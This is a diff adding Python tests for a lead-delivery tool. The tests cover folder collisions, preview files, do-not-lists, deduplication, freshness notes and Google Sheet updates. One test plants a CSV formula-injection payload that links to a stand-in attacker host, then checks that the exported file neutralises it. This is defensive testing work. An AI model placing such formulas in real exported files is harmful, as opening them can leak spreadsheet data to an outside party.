@@ -350,6 +350,35 @@ def test_an_existing_delivery_is_never_overwritten(ws, store):
     assert third.folder == first.folder.with_name("2026-09-24-3")
 
 
+def test_a_shared_output_folder_never_mixes_deliveries(ws, store):
+    out = ws.root / "reports"                        # a fixed --out: no {client} / {date}
+    acme = run(make_client(ws), store, out_dir=out)
+    acme_qa = (acme.internal_dir / "qa.txt").read_text(encoding="utf-8")
+    other = run(Client("beta-staffing", playbook=str(ws.playbook), roles=["accountant", "controller"],
+                       company_size={"min": 20}), store, out_dir=out)
+    assert acme.folder == out and other.folder == ws.root / "reports-2"
+    assert any("already holds another delivery" in n for n in other.qa.notes)
+    # acme's folder holds only acme's files, and its QA / not_delivered.csv were not overwritten
+    assert sorted(p.name for p in out.iterdir()) == sorted([INTERNAL_DIR] + [p.name for p in acme.files.values()])
+    assert (acme.internal_dir / "qa.txt").read_text(encoding="utf-8") == acme_qa
+    # the same client next week, with a folder that has no {date}: a new folder, not last week's
+    later = run(make_client(ws, freshness_days=30), store, out_dir=out, today=TODAY + timedelta(days=7))
+    assert later.folder == ws.root / "reports-3"
+    assert [p.name for p in later.folder.glob("*.csv")] == ["acme-hiring-signals-2026-10-01.csv"]
+
+
+def test_not_delivered_csv_is_guarded_against_formula_injection(ws, store):
+    evil = '=HYPERLINK("http://attacker.example/?"&A2,"click")'
+    ws.jobs(JOBS + [[evil, "inj-dlv.example", "Austin, TX", "Software", 3, "job_posting", "Accountant",
+                     "2026-09-22", "https://inj-dlv.example/jobs/1", "i-1"],
+                    ["@Plus Co", "plus-dlv.example", "Austin, TX", "Software", 4, "job_posting", "Accountant",
+                     "2026-09-22", "https://plus-dlv.example/jobs/1", "p-1"]])
+    res = run(make_client(ws), store)
+    rows = read_csv(res.internal_dir / "not_delivered.csv")
+    assert {r["company"] for r in rows} >= {"'" + evil, "'@Plus Co"}
+    assert not [r for r in rows for v in r.values() if v[:1] in ("=", "+", "-", "@")]
+
+
 # --- selection ----------------------------------------------------------------------------------------
 
 def _lead(name: str, tier: str = "normal", score: int = 50, *, email: str = "", linkedin: str = "",
@@ -521,8 +550,29 @@ def test_dry_run_records_nothing_and_writes_previews(ws, store):
     real = run(client, store)                    # previews never block the real delivery's folder
     assert real.folder == preview.folder
     assert names(real) == names(preview) and real.recorded > 0
-    assert {p.name for p in real.folder.glob("*.csv")} == {"acme-hiring-signals-2026-09-24-PREVIEW.csv",
-                                                           "acme-hiring-signals-2026-09-24.csv"}
+    # ... and the real delivery moves them into _internal/: "send everything outside _internal" is exactly
+    # what was delivered (a preview row the real run left out is not in the ledger and would be sold again)
+    assert sorted(p.name for p in real.folder.iterdir()) == sorted([INTERNAL_DIR] + [p.name for p in
+                                                                                     real.files.values()])
+    moved = real.internal_dir / "preview"
+    assert sorted(p.name for p in moved.iterdir()) == sorted(p.name for p in preview.files.values())
+    assert any("PREVIEW files" in n and "moved" in n for n in real.qa.notes)
+
+
+def test_preview_rows_the_real_delivery_left_out_never_reach_the_client_folder(ws, store):
+    client = make_client(ws, leads_per_week=2)
+    preview = run(client, store, dry_run=True)
+    assert names(preview) == ["Acme Corp", "Gamma Inc"]
+    ws.jobs(JOBS + [["Hotco", "hotco-dlv.example", "Austin, TX", "Software", 150, "job_posting",
+                     "Senior Accountant", "2026-09-24", "https://hotco-dlv.example/jobs/1", "hc-1"]])
+    ws.contacts(CONTACTS + [["Hotco", "hotco-dlv.example", "Max", "Hot", "CFO", "max@hotco-dlv.example",
+                             "valid", ""]])
+    real = run(client, store)                    # found a hotter lead: Gamma Inc is held back
+    assert real.folder == preview.folder and "Gamma Inc" not in names(real)
+    sendable = [p for p in real.folder.iterdir() if p.name != INTERNAL_DIR]
+    assert sorted(sendable) == sorted(real.files.values())
+    assert not any("Gamma Inc" in p.read_text(encoding="utf-8-sig", errors="ignore")
+                   for p in sendable if p.suffix in (".csv", ".html"))
 
 
 def test_client_do_not_list_exclusions_and_global_suppression(ws, store):
@@ -535,6 +585,26 @@ def test_client_do_not_list_exclusions_and_global_suppression(ws, store):
     reasons = dict(qa.top_reasons)
     assert reasons["on this client's do-not-list"] == 2
     assert reasons["domain is on the suppression list"] == 1
+
+
+def test_the_client_file_exclusions_count_as_its_do_not_list(ws, store):
+    # clients/_template.yaml: "exclusions: The client's own do-not-list" (companies, domains, keywords)
+    res = run(make_client(ws, exclusions={"domains": ["beta-dlv.example"], "keywords": ["gamma"]}), store)
+    assert names(res) == ["Acme Corp"]
+    assert res.qa.suppressed == 2 and "on a do-not-list ........... 2" in res.qa.text()
+
+
+def test_a_company_delivered_with_a_domain_is_not_delivered_again_without_one(ws, store):
+    assert "Acme Corp" in names(run(make_client(ws), store))
+    # next week a job board without domains (e.g. Adzuna) lists Acme again, and the very same ad
+    ws.jobs([["Acme Corp", "", "Austin, TX", "Software", 120, "job_posting", "Senior Accountant", "2026-09-29",
+              "https://acme-dlv.example/jobs/1", "a-1"],
+             ["Acme Corp", "", "Austin, TX", "Software", 120, "job_posting", "Payroll Accountant", "2026-09-30",
+              "https://acme-dlv.example/jobs/7", "a-7"]])
+    later = TODAY + timedelta(days=7)
+    assert names(run(make_client(ws), store, today=later)) == []                     # company dedupe
+    res = run(make_client(ws, dedupe=["job", "contact"]), store, today=later)       # job dedupe
+    assert [r["job_titles"] for r in res.package.rows] == ["Payroll Accountant"]
 
 
 # --- freshness ------------------------------------------------------------------------------------------
@@ -569,6 +639,36 @@ def test_wider_window_undated_jobs_and_reposts_when_the_client_allows_them(ws, s
     assert res.package.notes == ["Jobs posted in the last 30 days (as of 2026-09-24).",
                                  "Companies, jobs and contacts already sent to you in earlier deliveries are "
                                  "left out."]
+
+
+def test_notes_and_period_follow_the_playbook_actually_run(ws, store):
+    # 'overrides' are deep-merged last: they, not freshness_days / allow_undated, decide what is delivered
+    res = run(make_client(ws, overrides={"signals": {"max_age_days": 30, "allow_undated": True}}), store)
+    rows = {r["company"]: r for r in res.package.rows}
+    assert rows["Delta Co"]["posted"] == "posted 23 days ago" and rows["Epsilon Ltd"]["date_posted"] == ""
+    assert res.package.period_start == TODAY - timedelta(days=30)
+    assert res.package.notes[:2] == ["Jobs posted in the last 30 days (as of 2026-09-24).",
+                                     "Re-posted (stale) job ads are left out."]
+    assert not any("without a posting date" in n for n in res.package.notes)
+
+    with Store(":memory:") as fresh:             # no freshness window at all
+        res = run(make_client(ws, overrides={"signals": {"max_age_days": None}}), fresh)
+    assert "Delta Co" in names(res)
+    assert res.package.notes[0] == "Jobs of any posting date (no freshness limit), as of 2026-09-24."
+    assert res.package.period_start == date(2026, 9, 1)          # the oldest job delivered
+
+
+def test_job_postings_follow_the_client_rules_on_any_base_playbook(ws, store):
+    # a base playbook built around another signal (templates/saas-funding.yaml: primary [funding]):
+    # the client's roles / undated / re-post rules must still apply to every job posting
+    _mark_beta_as_reposted(store)
+    ws.playbook_text(extra="signals: {primary: [funding]}\n")
+    res = run(make_client(ws), store)
+    assert names(res) == ["Acme Corp", "Gamma Inc"]
+    rejected = {r["company"]: r["reason"] for r in res.run.rejected}
+    assert "not matching" in rejected["Eta Systems"]             # Software Engineer: not a role they fill
+    assert "without a posting date" in rejected["Epsilon Ltd"]
+    assert "re-posted" in rejected["Beta LLC"]
 
 
 # --- email honesty ----------------------------------------------------------------------------------------
@@ -722,6 +822,9 @@ class _Sheet:
         assert value_input_option == "RAW"
         self.values = values
 
+    def get_all_values(self) -> List[List[Any]]:
+        return [list(r) for r in self.values if any(str(v).strip() for v in r)]
+
     def freeze(self, rows: int = 0) -> None:
         pass
 
@@ -790,6 +893,38 @@ def test_google_sheet_is_not_pushed_in_a_dry_run(ws, store, monkeypatch):
     res = run(_sheet_client(ws, "sheet-123"), store, dry_run=True)
     assert gs.opened == [] and res.sheet_url == ""
     assert "Google Sheet not updated (dry run)" in res.qa.notes
+
+
+def test_an_empty_same_day_redelivery_never_touches_the_sheet(ws, store, monkeypatch):
+    book = _Book("sheet-123")
+    monkeypatch.setitem(sys.modules, "gspread", _fake_gspread(book))
+    client = _sheet_client(ws, "sheet-123")
+    first = run(client, store)
+    assert len(book.sheets["acme 2026-09-24"].values) == 4
+
+    # the same day again (a config fix, or by accident): the ledger dedupes everything -> 0 rows.
+    # An empty delivery is not sent - also not to the sheet the client reads
+    second = run(client, store)
+    assert second.folder == first.folder.with_name("2026-09-24-2") and second.package.rows == []
+    assert [r[0] for r in book.sheets["acme 2026-09-24"].values[1:]] == names(first)
+    assert list(book.sheets) == ["acme 2026-09-24"]
+    assert second.sheet_url == "" and "Google Sheet not updated (no leads in this delivery)" in second.qa.notes
+
+
+def test_a_same_day_redelivery_with_new_leads_never_replaces_the_earlier_tab(ws, store, monkeypatch):
+    book = _Book("sheet-123")
+    monkeypatch.setitem(sys.modules, "gspread", _fake_gspread(book))
+    client = _sheet_client(ws, "sheet-123")
+    first = run(client, store)
+    ws.jobs(JOBS + [["Hotco", "hotco-dlv.example", "Austin, TX", "Software", 150, "job_posting",
+                     "Senior Accountant", "2026-09-24", "https://hotco-dlv.example/jobs/1", "hc-1"]])
+    second = run(client, store)
+    # like the files (-> <folder>-2), the rows never replace the earlier delivery's tab
+    assert second.folder == first.folder.with_name("2026-09-24-2") and names(second) == ["Hotco"]
+    assert [r[0] for r in book.sheets["acme 2026-09-24"].values[1:]] == names(first)
+    new_tabs = [t for t in book.sheets if t != "acme 2026-09-24"]
+    assert len(new_tabs) == 1 and [r[0] for r in book.sheets[new_tabs[0]].get_all_values()[1:]] == ["Hotco"]
+    assert second.sheet_url
 
 
 def test_a_failed_google_sheet_push_is_a_warning_and_the_delivery_still_counts(ws, store, monkeypatch):
